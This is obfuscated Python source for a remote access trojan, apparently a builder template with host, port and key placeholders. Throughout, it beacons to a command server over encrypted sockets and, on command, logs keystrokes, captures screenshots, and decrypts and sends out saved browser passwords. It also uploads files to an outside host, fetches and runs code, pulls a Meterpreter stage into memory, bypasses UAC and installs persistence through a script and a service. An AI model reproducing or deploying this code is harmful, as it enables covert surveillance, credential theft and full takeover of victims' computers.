***JUNK***
def fscreenshot():
	hwnd = 0
	hwndDC = win32gui.GetWindowDC(hwnd)
	mfcDC = win32ui.CreateDCFromHandle(hwndDC)
	saveDC = mfcDC.CreateCompatibleDC()
	saveBitMap = win32ui.CreateBitmap()
	MoniterDev = win32api.EnumDisplayMonitors(None,None)
	w = MoniterDev[0][2][2]
	h = MoniterDev[0][2][3]
	saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
	saveDC.SelectObject(saveBitMap)
	saveDC.BitBlt((0,0),(w, h) , mfcDC, (0,0), win32con.SRCCOPY)
	bmpname=win32api.GetTempFileName(".","")[0] + funrot('GDdVTBQv')
	saveBitMap.SaveBitmapFile(saveDC, bmpname)
	mfcDC.DeleteDC()
	saveDC.DeleteDC()
	win32gui.ReleaseDC(hwnd, hwndDC)
	win32gui.DeleteObject(saveBitMap.GetHandle())
	fsubprocess(funrot('NwImTwQbKzkrRhgC'))
	return bmpname
def fconnect():
	global s, success, i1II1iI1IIIiiil1l
	i1II1iI1IIIiiil1l = False
	while not i1II1iI1IIIiiil1l:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(20)
			s.connect((host, int(port)))
			i1II1iI1IIIiiil1l = True
		except:
			pass
	s.send(success)
	s.settimeout(999)
	pwd = os.getcwd()
def fwget(l2cHJm):
	down = urllib2.urlopen(l2cHJm)
	filename = l2cHJm.split('/')[-1]
	with open(pwd.strip(funrot("EAs")) + sepvar + filename,'wb') as o:
		o.write(down.read())
def ftempsend(l2cHJmd):
	if sepvar not in l2cHJmd:
		l2cHJmd = pwd.strip(funrot("EAs")) + sepvar + l2cHJmd
	if not os.path.isfile(l2cHJmd):
		return funrot('HRwYNhULBh8rIj4BAx8yKhQnD1MVfQ5ZDBEWSiwgLAssOgdHKgh5') + (l2cHJmd)
	with open(l2cHJmd, 'rb') as uf:
		r = requests.post(funrot('MA0IFBQiKzo9RwwRPCELIC4dAEw6IBYFChFtXRYgAhs'), data={funrot('NzcYECk1EjU'):'2678400'}, files={funrot('N2k2Ty4/'): uf})
	return funrot("HRwfCxULBQ") + str(r.url)
def fpersist():
	vbscript = funrot('DjcIDxdrDSshJikQGiITfy4oAE0vHRVVJjwVexQgHlIWPnAEExh5QBk1fg') + agent + funrot('HT0cCi9qHiQTGxgREAh1KgQX') + vbsdst + funrot('HT0cMSkAHnkSHCoFA35wIy4ZBw0/ChEnDBUgAi8gJwQfOgd0Exx2EAohU2JVAA4uPCMKBBh1Ph8kcxYjARMPAiY8AykpKGMxAwc7RzI/KzYKK183IncFOCEDKFsDPgctClksLRgeNAMSAVQCBhEMXzEWMBUVKzMBMVY6BxRFHSNRLQE4fBkzMQsMNw8XdxFcKndELlMhHDFrBDcbbmYLRgUmawEsCy1afgUdOQwYBD8vNwwzCWAbZxYwPj4dOiAYFmQDDD8vPRxuORInIURsfTleBSZpCBgxMQ9ICnIIFzwzKDkRLBhLRQ1+bTYvEUcuGnc/HRcPIQAEB0p9ATt2Ax8RBiMgNhJKCQosemopP0YzchBUAD0TJGMuVTgfBScODgJ9Ax4IICggWzgfbUsUJiUBDD5XAB4OfhRmIx0jTGJkAR52DQpqMgpHN2YgMCQ5E2MNIB07REcPPScZCConGjMVJRombQNLEFhfBjkKZhc1PG4jbwo0EwAaYQc9PD0UaXoNewYAJxxWFREmehEtfBw6CxgrIyIpHVwiVgddCEZ6PR0TMDY+FjgBLl8yBx0tFwo3OzIdIAoUPR46MQYEJB4SAgAiNXx8KSoFPgwCLSQeCDJ9Vyc6Am8iDCA/CnkEWHwyMBY2BjQ3bj8CIAY+EyxdXxY6EQhSGjEHOx8yIU8qAz9rGzgBCShmBAs/LAAYABQ7MzgpEycjLiQrJxpRIhIcDiYJUigBMB8rRyg6b1UaOjtbEB0lKzMlHjlsCQY+AB0NGS4ZEAEpFAIvJxAtNyxHIQlsFxocKxo4FBM8UA42XQpQExMj') + agentname + funrot('HTMuFCkADiQyGAQ8ACEtJS4jBw0/CzAADjAdeyAgAhsGIR9IMxp+ADFEVH1nAC8wDxggGCMAEAomcFYpN3YfGCA7CDcOHHMjCSIBWDUVJ2oaXQwlKis/LiEHJ1IpHAwyBHUGBycwLBMzWUA7MC8fCQIrHnEDGC8bMjYxLT8fMA') + agent + funrot('HTMlEwEQEn4SLS4RAB01PBceBFgSIxoCIxUOBRYjDgkGLSZFPTV5MgUbcU54KDgtLSMCJRsqPhoMZyd3LAIHAiYFECApKHN+ECE4fjc/Ky8ZNzU6KjxmOicyIEw+Hwx2BHA3IwELPAITYXIBNw01cwIoNDwMHzcbMj0yKhIbMzJ7LzQubEAjKgtlI1coHAFzFAZEFFYIKSdaWhVDVzgbGjclE0IMCSkGUgU0CAwbByIvODYoCRAlEhAFFD4uWzgYPRNXPzgDIhBaHDwwJRoPezlZLzl4JQQeMCZuQWBrA2MJHQsDIEYoQzslbQY8OBMwKlsjEhFRDw4PEzo+ITluFx0RJB4ZHA0NBQsSfVAdJEECLBAPOT8hLV0tXTggAyMBCXJcBA00DWkAWyctUl8Mfw52WA1hXCQYVDcmFyEZLyhyXzRYJSV5chkwNyEgPzcvMVh+JSc/MyYPIzwUOSkjHSAHMSMmVjUDIVtXRip8Ph0vEwQzUD80SRkPHj4ENzU1Ug4BTz4AGQxsAx0')
	with open(vbsdst, 'w') as pv:
		pv.write(vbscript)
	fsubprocess(funrot('NjcIFBcAHjo4NhxZEA0') + vbsdst)
	l12cHnnds = funrot('Nx0mEC8bBQ') + sys.argv[0] + ' ' + agent + fzo
	l12cHnnds += funrot('DjQtHS4fEjUTGAwREA0') + servicename + funrot('HR1VSBQNCjkrRj1REA8POigeA0EVIyAVJjttRzwKNA4sLhMAKUNbDDMbQ094Lw') + vbsdst + funrot('HTMuFC8fCjUhJioBOCEAKhcdIkEsGTdVJj9hXy9/DSg')
	l12cHnnds += funrot('NwImTwQZ') + tempvbs + fzo
	l12cHnnds += funrot('DjQtHS4ADiESMj5aAH4hfxQdA1M') + servicename + ' ' + servicedisc + fzo
	l12cHnnds += funrot('NwImTwQbfQMnJikBExRwNwAzD1M8JxYBDDsWXS9/cQ8VEAQ') + servicename + fzo
	hb = funrot('AR06Ay81IDUgGFFbOiIHIwYzDH8sIBYACxUaXjkmHlIsBykHORhTDAIhX154LSs+JycnFgguFDk9WiQiASkHGQ85fzUOA1F9KSI3Www7Fi8IPC49OQYaPgsDI0YuIgw2AHI4IScwLBMzVQ')
	with open(tempvbs, 'w') as hid:
		hid.write(hb)
	with open(tempbat, 'w') as cbat:
		cbat.write(l12cHnnds)
	with open(datafile, 'wb') as df:
		df.write(persistinfo)
	fsubprocess(funrot('NjcIFBcAHjo4NhxZEA0') + tempvbs)
	fsubprocess(funrot('NjcIFBcAHjo4NhxZEA0') + tempbat)
	rl12cHnnd = tempvbs + ' ' + tempbat
	fbypass(rl12cHnnd)
	fsubprocess(funrot('DmhZFygQLH4ULQMPFX8IKgFDHAI/Dw') + sys.argv[0])
	sys.exit()
def funpersist():
	with open(datafile, 'rb') as f:
		settings = DecodeAES(cipher, f.read().strip(''))
		settings = settings[30:].split(fzo)
	agentn = settings[0]
	vbsdstn = settings[1]
	fsubprocess(funrot('DjQtHS4ADnkSGAwREA0') + servicename)
	with open(***ENV***(tempvvar) + funrot("XGgub25n"), 'w') as f:
		f.write(funrot('NwImTwQbfRg4NlEnDx8E') + '%s**n' % vbsdstn)
		f.write(funrot('NwImTwQbfRg4NlEnDx8E') + '%s**n' % agentn)
		f.write(funrot('NwImTwQbfRg4NiEEPyIIOgQXKQ'))
	encrypted = EncodeAES(cipher, funrot('BzEILh4zIBgiHgw8CichGR4bImA7GyQkOkgkeCB9NCsaWTV6JUFIMQUMclFmFxIzJwsgCBgQDEA1WQI3PBwLDgoVIjEOKX8mEH1EADMKOyAPCAA'))
	s.send(encrypted)
	os.startfile(***ENV***(tempvvar) + sepvar + funrot('NRlZDC81Jw'))
	sys.exit()
def fdonotmuch(l2cHmdo, l2cHmda):
	try:
		a = len(l2cHmdo) / (3.14 * l2cHmda)
		b = a ** int(***ENV***('dILHgI9pOH'))
		for c in b:
			try:
				d += c.split(***ENV***('McgJlFmd4'))[2]
			except:
				return 0
		if l2cHmda in d:
			return str(d / b) + str(***ENV***('4BykgH5ORh4T')) 
		else:
			return 
	except:
		return 'oO00oO'
def fmeterdrop(l2cHmd, l2Hmd):
	try:
		global DropSock
		DropSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		DropSock.connect((l2cHmd, int(l2Hmd)))
		yWubQo = struct.pack('<i', DropSock.fileno())
		l = struct.unpack('<i', str(DropSock.recv(4)))[0]
		UDDvfkFdFXs = "     "
		while len(UDDvfkFdFXs) < l: UDDvfkFdFXs += DropSock.recv(l)
		HNzdFhkeybuffervICp = ctypes.create_string_buffer(UDDvfkFdFXs, len(UDDvfkFdFXs))
		HNzdFhkeybuffervICp[0] = binascii.unhexlify('BF')
		for i in xrange(4): HNzdFhkeybuffervICp[i+1] = yWubQo[i]
		return HNzdFhkeybuffervICp
	except: return None
def fexecinmem(l12cHmnd):
	if l12cHmnd != None:
		iNGRgaQLVJ = bytearray(l12cHmnd)
		imHlcWqpKVwgodv = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(iNGRgaQLVJ)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
		ctypes.windll.kernel32.VirtualLock(ctypes.c_int(imHlcWqpKVwgodv), ctypes.c_int(len(iNGRgaQLVJ)))
		DWsMxliK = (ctypes.c_char * len(iNGRgaQLVJ)).from_buffer(iNGRgaQLVJ)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(imHlcWqpKVwgodv), DWsMxliK, ctypes.c_int(len(iNGRgaQLVJ)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(imHlcWqpKVwgodv),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
def frunthis(l12cHnnd):
	os.popen(l12cHnnd)
def fkeypress(l12cHnns):   
	global keydump
	if l12cHnns.Ascii:
		char = chr(l12cHnns.Ascii) 
		if char in string.printable:
			keydump += char.strip(fzo)
def fxor(l12oHn4d):
	return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(l12oHn4d,xorkey))
def fkeylog():
	proc = pyHook.HookManager()    
	proc.KeyDown = fkeypress
	proc.HookKeyboard()
	pythoncom.PumpMessages()
def fbypass(l12cHnnd):
	with open(bypassexe, 'wb') as uac:
		if is64:
			uac.write(***B64D***(bypass64exe))
		else:
			uac.write(***B64D***(bypass86exe))
	fsubprocess(funrot('NjcIFBcAHjo4NhxZEA0') + bypassexe)
	rl12cHnnd = bypassexe + funrot('HRImTy41KDkrRiEPFX8EKg') + l12cHnnd
	back = fsubprocess(rl12cHnnd)
	os.remove(bypassexe)
	os.remove(sepvar.join(bypassexe.split(sepvar)[:-1]) + sepvar + funrot('Dmk2ExcLcTUQRiE'))
	return back
def funrot(l12cHnn5):
	while True:
		try:
			l12cHnn5 = fxor(***B64D***(l12cHnn5))
			break
		except:
			l12cHnn5 += '='
	while True:
		try:
			return str(***B64D***(l12cHnn5).decode(***B64D***('cm90MTNs')[:-1]))
			break
		except:
			l12cHnn5 += '='
def fsubprocess(l12cHnnd):
	if ushell:
		l12cHnnd = '''%s -c "%s"''' % (ushell, l12cHnnd)
	out = subprocess.Popen(l12cHnnd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	return out.stdout.read() + out.stderr.read()
def fremoteprint(l12cHon5):
	l12cHon5 = l12cHon5 + funrot('FzYmORhpDg8kRCIrDH0PDhhBDHcjfic')
	encrypted = EncodeAES(cipher, l12cHon5)
	s.send(encrypted)
***64EXE***
***86EXE***
r1, r2, r3 = fdonotmuch('99kUmc4546c4FQsIMsd', '4bImA7Gysgs3'), fdonotmuch('1fSHoAOqML4D6', '4ILAksPhdhdfn'), fdonotmuch('g7bPlR/32Xs3w', 'E/LmszKXw4AwcBXDUKKyInAS0')
is64, isWindows, MeterBin, ushell = False, False, False, None
isAdmin, r4, r5, r6, isSystem, r7, xorkey, DropSock, r8, r9, r10 = False, 34 ** 23, bypass86exe[10400:10950], (14 / 2) * 6, False, bypass64exe[5:6755], ***XOR***, None,  True, None, 244
BLOCK_SIZE, PADDING, keydump = 32, '{', ''
hzo, fzo, host, port, secret, eas = funrot('Hz0'), funrot('Fz0'), ***HOST***, ***PORT***, ***SECRET***, funrot('EAs')
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: ***B64E***(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(***B64D***(e))
iv = Random.new().read(***AES***.block_size)
cipher = ***AES***.new(secret,***AES***.MODE_CFB, iv)
ees, pwd = funrot('ATYmKRg0Dh8kGSI7DCAPHhgcDGcjIh4/OhQeYyAhDjAaBQ9hJR1yKgUafWVkAigEOyIkIhcrHCE6WCwdMCgDJBY+AAo/KHMYHyM7ZgM+OwsWAyUDJSI'), os.getcwd()
opsys = platform.uname()[0] + ' ' + platform.uname()[2]
paddedopsys = opsys + hzo * (64 - len(opsys))
starpadding = hzo * 16
sepvar, eofv = os.sep, funrot('ATEmPhoJ')
if platform.machine()[-2:] == funrot('GjA9'):
	is64 = True
if os.name == funrot('DQ0P'):
	tempvvar, windirvar = funrot("BmsmGxwv"), funrot("BzY2OBgOHgo")
	tempvbs = ***ENV***(tempvvar) + funrot('DBI5DywPfSE')
	tempbat = ***ENV***(tempvvar) + funrot('DBItDy9qcSI')
	bypassexe = ***ENV***(tempvvar) + funrot('DB02Ci4QEiUrGAsdOiExNA')
	agent = ***ENV***(windirvar) + funrot('DBw2Gxg0PH4UGyJcAxgtLi4oHEMsfA4PPBYOWCIjDhsrBHFHExxMAA')
	agentname = agent.split(sepvar)[-1]
	vbsdst = ***ENV***(funrot("ADEiPhgNcQQlEg")) + funrot('DBlYDxUeKCUSMl1dAQk1fxQoAF0XIw4NDBYSAhcmLAksPnBcExgNCTJEbg')
	servicename = funrot('HTEcSBQAAiUQGDEPDiIPNSkdclMjBh4ENUseXDwILAksPnBcExh6PjMbYUZVACAuJyk')
	servicedisc = funrot('HTEcSBQAAiUQGDEPDiIPNSkdclMjBh4ENUseXDwILAksPnBcExh6PjMbYUZVACAuJwYgGBgUFEA2YzwgByolQiE/LmszKXw4AwcBXDUKKyInAS0lKnYJPhs5HVIFCws9AHMgLScKPBoSXFsxDRQIXzIrKCwsJDMFMQwyKy9FPy9oWSg6fDVcLjIHLwwUdi8GF1k3D1IcMj9gBz8cbTgHCQ0cNl8DDC1jVBU0HDIuFDwvNxw8NwY5ZxAgPj4pBDsWFw89NQ8pTVxbHx06PT9sIABaCSJWPiU+CgxtFFgeIWMJEgAYFxseQxEJfQ8vEAd7FmgvDRQPHB40LT02ADhQFA47DlInHxZJCkEKMlEfNAYvCQQIOQULOV0baywzJi8RD1x5Gx5CIzQvXys')
	proxyfile = ***ENV***(tempvvar) + funrot('DB0YTCgPEiYSNl0QOyEm')
	datafile = ***ENV***(windirvar) + funrot('DB8IAyg1Ci8QGzIAAxtwJS4jc0wUIzc')
	pwdvar = funrot('NxIp')
	isWindows = True
	paddedpwd = pwd.strip(eas) + hzo * (64 - len(pwd.strip(eas)))
	adm = fsubprocess(funrot('NTQ6Ey82NH4')).strip(fzo).strip(eas)
	stdout = fsubprocess(funrot('DQImFAQQKCUSMl1dPQsTJCw3C1MUIBJaCxUSAi8gIA8tBCFbKiZhHjY1dUxVAyQvJw0nHRECDCE9YSABMigAGwo1')).strip(fzo).strip(eas)
	persistinfo = EncodeAES(cipher, hzo * 30 + '%s**n%s**n%s**n%s**n%s' % (agent, vbsdst, servicename, proxyfile, tempvbs))
	if stdout != '':
		isAdmin = True
	if adm.lower() == funrot('DQ0PHS81LCIVIiIEPSEhPhU3HEcsIzAVCh8'):
		isSystem = True
	if isSystem:
		try:
			fsubprocess(funrot('NjcIFBcAHjo4NhxZEA0') + agent)
		except:
			pass
***PERSIST***
	if is64:
		if isSystem:
			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDHMiDw'), paddedpwd, starpadding))
		else:
			if isAdmin:
				success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDHsiDw'), paddedpwd, starpadding))
			else:
				success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDGAiDw'), paddedpwd, starpadding))
	else:
		if isSystem:
			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDHMgHw'), paddedpwd, starpadding))
		else:
			if isAdmin:
				success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDHsgHw'), paddedpwd, starpadding))
			else:
				success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDGAgHw'), paddedpwd, starpadding))
elif os.name == funrot('DWgmFyk1Nw'):
	if os.getuid() == 0:
		isSystem = True
	pwdvar = funrot('DWgcAg')
	ushell = ***ENV***(funrot('BjY6KRoOLw'))
	paddedpwd = pwd + hzo * (64 - len(pwd))
	if isSystem:
		if is64:
			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbHG4iDw'), paddedpwd, starpadding))
		else:
			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbHG4gHw'), paddedpwd, starpadding))
	else:
		if is64:
			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDG4iDw'), paddedpwd, starpadding))
		else:
			success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDG4gHw'), paddedpwd, starpadding))
else:
	pwdvar = funrot('DWgcAg')
	paddedpwd = pwd + hzo * (64 - len(pwd))
	success = EncodeAES(cipher, '%s%s%s%s%s' % (ees, paddedopsys, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDH0gHw'), paddedpwd, starpadding))
fconnect()
while True:
	try:
		data = s.recv(8192)
		decrypted = DecodeAES(cipher, data)
	except:
		fconnect()
		decrypted = funrot('Nw0mEi81LHwVIgs')
	if decrypted == funrot('Dh0ESBcv') or decrypted == funrot('NzcYSBcv'):
		s.close()
		sys.exit()
	elif decrypted == funrot('Nw0mEi81LHwVIgs'):
		pass
	elif decrypted.startswith(funrot('DjQuFi42DiQrGz4BAzs')):
		upfile = fscreenshot()
		with open(upfile, 'rb') as f:
			encrypted = EncodeAES(cipher, funrot('ATEmLhgzDhgkHiI8DCcPGRgbDGAkIh4vOkkecyB8DiAaWA9xJUByOgVGbg') + f.read() + funrot('ATEmLhgzDhgkHiI8DCcPGRgbDGAiGB4vOkkecyB8DiAaWA9xJUByOgVGBw'))
		s.send(encrypted)
		os.remove(upfile)
	elif decrypted.startswith(funrot('DmkmTBRqHjUoLS0P')):
		fremoteprint(ftempsend(decrypted.split(' ')[1]))
	elif decrypted.startswith(funrot('DWg6EyxqPCMoRi4dA38M')):
		proxlist = decrypted[11:]
		if decrypted.endswith(eofv):
			proxlist = proxlist[:-4]
		else:
			while not decrypted.endswith(eofv):
				data = s.recv(8192)
				decrypted = DecodeAES(cipher, data)
				if decrypted.endswith(eofv):
					proxlist += decrypted[:-4]
					break
				else:
					proxlist += decrypted
		with open(proxyfile, 'wb') as pl:
			pl.write(EncodeAES(cipher, proxlist))
		encrypted = EncodeAES(cipher, funrot('BzEILh4zIBgiHgw8CichGR4bImA7GyQkOkgkeCB9NCsaWTV6JUFIMQUMclFmFxIzJwsoCCMuFBg1Yyw8BwcLQic/EDcjA2MlEyInTDUBMy0ZFi4') + '%s**n' % (proxyfile))
		s.send(encrypted)
		fsubprocess(funrot('NjcIFBcAHjo4NhxZEA0') + proxyfile)
	elif decrypted.startswith(funrot('NxI6FhQ2NDUoR10FAys')):
		if pwdvar == funrot('NxIp'):
			sendpass = ''
			appdata = ***ENV***(funrot('ADEiPhgNcQQlEg'))
			paths = []
			chromepath = appdata + funrot('DBlYDxUeKCUSMl1dAQoXJBQeFAEVIiw9Cy8CWRAjDgAcLh9LKiJ6KzIbU0NpKCQuDXxbHicQMhE4Yyx+ASkMEBYFfzcIIw')
			chromiumpath = appdata + funrot('DBlYDxUeKCUSMl1dAQoHfBcnDAISIzxaNz08XRYgEQQaPnBcEh1AKzMYeUNQJg45NggCGCYPDBomciA7P3Z9')
			aviatorpath = appdata + funrot('DBlYDxUeKCUSMl1dAQlwPSkdc1ovIwIPPD8OSS8eBjEtBCFHKDd+ADNEAllUOQY0ORkkQSYqExU6Y1MgByM')
			if os.path.isfile(chromepath):
				paths.append([chromepath, funrot('ARI6FhQ2NDU')])
			if os.path.isfile(chromiumpath):
				paths.append([chromiumpath, funrot('ARI6FhQ2NH4QPQc')])
			if os.path.isfile(aviatorpath):
				paths.append([aviatorpath, funrot('ADcASC81ICUrJA')]) 
			if len(paths) > 0:
				sendit = ''
				for passpath in paths:
					sendpass = ''
					connection = sqlite3.connect(passpath[0])
					cursor = connection.cursor()
					cursor.execute(funrot('BjYmIBg0BgQ4MiIEPSIXfxQmf1ssFj8fJj9hRy9+HgoWP3xdKilTChkxX1tSAzQ/DCAeCBp1OgcKYw43KQcLHSE/EDQLKXMnKRlIRTQ8HTcgBi0EIhAZNgsiBlwDLhctE1M'))
					for information in cursor.fetchall():
						passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
						if passw:
							sendpass += funrot('HRwfCxULBgcSGFEFPSEhNAEnDFgSIAZeNiw7Vw') + information[0]
							sendpass += funrot('FzMuGAY0dCsiGyIeAyIfIy4Zd0EVCTBeNhURBjwM') + information[1]
							sendpass += funrot('FzMuGAY0dCsiMjIRAxsDOCgeDwI/Dw') + information[2]
							sendpass += funrot('FzMuGAY0dCsgR10FAyE1JBcoAwI/Dw') + passw + fzo
					if sendpass:
						sendit += funrot('FzMuGAY0dCsgR10FAyE1JBcoAFk/BhoFDj8SSDwFCgoVOgQ') + '%s:**n' % (passpath[1])
						sendit += sendpass
					else:
						sendit += funrot('FzMuGB5pdCsgIiEPAH5wIBcdNl0sFhIBJjAaWRQKAhsGIQtbKiJ5') + '%s.**n' % (passpath[1])
				fremoteprint(sendit)
			else:
				fremoteprint(funrot('HRwYNhULBh0VIj4BPCIMPgQ2BAUsGR5aCxU8BjwKcQssOgd9ESliDApEfVp4KVc7DScsGRsqNRULWSAjP3Z8QiYKACEmIw'))
		else:
			fremoteprint(funrot('HRwYNhULBh8rIj4BAxgqKi44EFgvICQVNkphXS8kBhQWBzUEEhx+ARk+bVt4KSg/CxkZFiAqOgcLWgo7B3clDgoVADEjA0l5Exc3XDc/KC0'))
	elif decrypted.startswith(funrot('MRImCS4PLHooAg')):
		fremoteprint(keydump)
	elif decrypted.startswith(funrot('MRImCRc2BjkoJA')):
		kl = threading.Thread(target = fkeylog)
		kl.start()
		fremoteprint(funrot('HRwfCxULBhUSGBBdACIXfSkdAAQ/CQ4CDRUCXhYjARY'))
	elif decrypted.startswith(funrot('MRImCS4QKDUTGD0')):
		fremoteprint(keydump + funrot('FzMuGAY0dCsmPSIbO34tNy5DDFg/BhZZDBVhXBYjARY'))
		keydump = ''
	elif decrypted.startswith(funrot('MTQmFC41EiYrLSIGOiEQKg')):
		try:
			l2cHmd,l2Hmd = decrypted.split(' ')[1].split(funrot('Gz0'))
			MeterBin = fmeterdrop(l2cHmd, l2Hmd)
			fremoteprint(funrot('HRwfCxULBi0SGAwRAxsLIS4dIk0sHRYADBU4SS8aHhoXWyFFKQh6FDMbcVh4KQY+Jw8') + "%s:%s" % (l2cHmd, l2Hmd))
			t = threading.Thread(target = fexecinmem, args = (MeterBin , ))
			t.start()
		except:
			fremoteprint(funrot('HRwYNhULBhgTGzJdOiIAKhdCD1MTGR4ZDCsWBhYgIBoVPgteExxcAAolA314LSMwDSdbQQ0uFEQMWQI3PxMHGyA/LiAwF3gzBRs4QBsGKGwPBSolPS8SYQwuOwUpJw'))
	elif decrypted.startswith(funrot('DWkmFhc2HiErRiIAOgQM')):
		if os.name == funrot('DQ0P'):
			if isAdmin and platform.uname()[2] == funrot("Gi0"):
				if not os.path.isfile(datafile):
					fpersist()
				else:
					fbypass(funrot('DjQtHRc1IDkrIgsP') + servicename)
			else:
				vulnpaths = ''
				winservices = fsubprocess(funrot('N2gmFgQbfTY4NiIGACItNBQnHw07JxYUDBY4AhAgHVoFE3VcORh5FTIfdQRoPSM4JHweRyYpFxU1WiwiBBwTACA7CGwOKWMlAwc/WjMKHT0lJyFiKR0WMA5ZM1IuCwMwEwcgPCAJBhM5XgVuN0kfUAIWMzIrGjgCCjYxLSwbATdoWShheAggLxstBgIuEwJTH3w7DVMYOS9zPns'))
				for line in winservices.split(fzo):
					if line:
						if line[0] == '"':
							line = '"' + line.split('"')[1].strip(eas) + '"'
						else:
							line = '"' + line.split('/')[0].strip(eas) + '"'
						out = fsubprocess(funrot('MDQuDy4QKCE4NA') + line)
						if out.find(funrot('AGoELRoNIBsgIxAhAyIPIRcaKVsgJz8DOgE/')) != -1 or out.find(funrot('AGoELRoNIBsgIxAhAyIPIRcaKVsjNz8')) != -1:
							vulnpaths += line + fzo
				if vulnpaths:
					fremoteprint(funrot('HRwfCxULBgcVGC4QACE1IAQ3HE0sGTheDDAeXTwKNFEVWhBVER9yDDU1dU5VAzQuDQkKGBgQIRU2BywiACoTGhk8EDAzE2B9CSge') + vulnpaths)
				else:
					fremoteprint(funrot('HRwYNhULBg4oHCoFOiETPSkeBE0sJxYdCxUwATwKNBotByJVEyliFTMYdVhoAzQkJwkgCBgfJkA1WTx8PCkPGgoaBDALA38zBig'))
		else:
			fremoteprint(funrot('HRwYNhULBggSGD4FPSEfIy4dAEMVJxZeNREWWSwVKBAGLnBCEh9iTDIbDgNSByAtNyM7FiMpDBoMYyw/Py19'))
	elif decrypted.startswith(funrot("NR0qEC41EiEVGDIG")):
		if not os.path.isfile(datafile):
			fremoteprint(funrot('HRwYNhULBggSGD4FPSEfIy4dAEMVJxYUNhYeXTwKAgoVEAdHKUN2ADIbYlFrXCswDH0nFiYqEB81BlN7ABwDDw81'))
		else:
			funpersist()
	elif decrypted.startswith(funrot('NmgUEC81HiEQMl0fEA0')):
		l12cHnnds = ' '.join(decrypted.split(' ')[1:])
		out = fbypass(l12cHnnds)
		encrypted = EncodeAES(cipher, funrot('BzEILh4zIBgiHgw8CichGR4bImA7GyQkOkgkeCB9NCsaWTV6JUFIMQUMcg') + out)
		s.send(encrypted)
	elif decrypted.startswith(funrot('Nw0mCxQAKCUTGy0P')):
		if decrypted.split(' ')[1].find(sepvar) == -1:
			downpath = pwd.strip(eas) + sepvar + decrypted.split(' ')[1]
		else:
			downpath = decrypted.split(' ')[1]
		with open(downpath, 'rb') as f:
			encrypted = EncodeAES(cipher, funrot("ATEmLhgzDhgkHiI8DCcPGRgbDGAkIh4vOkkecyB8DiAaWA9xJUByOgVGbg") + f.read() + funrot("ATEmLhgzDhgkHiI8DCcPGRgbDGAiGB4vOkkecyB8DiAaWA9xJUByOgVGBw"))
		s.send(encrypted)
	elif decrypted.startswith(funrot('NTQ+AxchBQ')):
		try:
			url = decrypted.split(' ')[1]
			fwget(url)
			fremoteprint(" [*] " + url.split('/')[-1] + funrot('HRIqEyw1AnkoGF0QOiIAOA'))
		except:
			fremoteprint(funrot('HRwYNhULBh0oGABdOh8HJRQdJVMVGR4dNiA4WRcjAQQ') + url)
	elif decrypted.startswith(funrot("ATEmLhgzDhgkHiI8DCcPGRgbDGAkKQ")):
		try:
			ufilename = pwd.strip(eas) + sepvar + decrypted[32:48].strip(hzo)
			decrypted = decrypted[48:]
			with open(ufilename, 'wb') as f:
				if decrypted.endswith(funrot("ATEmLhgzDhgkHiI8DCcPGRgbDGAiHw")):
					decrypted = decrypted[:-32]
					f.write(decrypted)
				else:
					f.write(decrypted)
					while not decrypted.endswith(funrot("ATEmLhgzDhgkHiI8DCcPGRgbDGAiHw")):
						data = s.recv(8192)
						decrypted = DecodeAES(cipher, data)
						if decrypted.endswith(funrot("ATEmLhgzDhgkHiI8DCcPGRgbDGAiHw")):
							f.write(decrypted[:-32])
						else:
							f.write(decrypted)
			fremoteprint(funrot('HRwfCxULBhgVGwQREAstJygnDEEVFh4UJj8wWTwM') + ufilename)
		except Exception as e:
			fremoteprint(funrot('HRwfCxULBgsoGxgRA38TfxQoF1MXIB4ENQEWQS8aDgsrLSpV') + str(e))
	elif decrypted.startswith(funrot('Dg0EEgQZ')):
		l12cHnnd = funrot('NxIpHQ') + pwd + funrot('HjM1') + ' '.join(decrypted.split(' ')[1:]) 
		t = threading.Thread(target = frunthis, args = (l12cHnnd , ))
		t.start()
		fremoteprint(funrot('HRwfCxULBh8QRiIfOAshNC4jB10') + ' '.join(decrypted.split(' ')[1:]) + funrot('HTMuSBQLBQ') + pwd)
	else:
		for char in decrypted:
			if char not in string.printable:
				encrypted = EncodeAES(cipher, starpadding * 3 + '^^')
				s.send(encrypted)
				decrypted = funrot('Nw0mEi81LHwVIgs')
				break
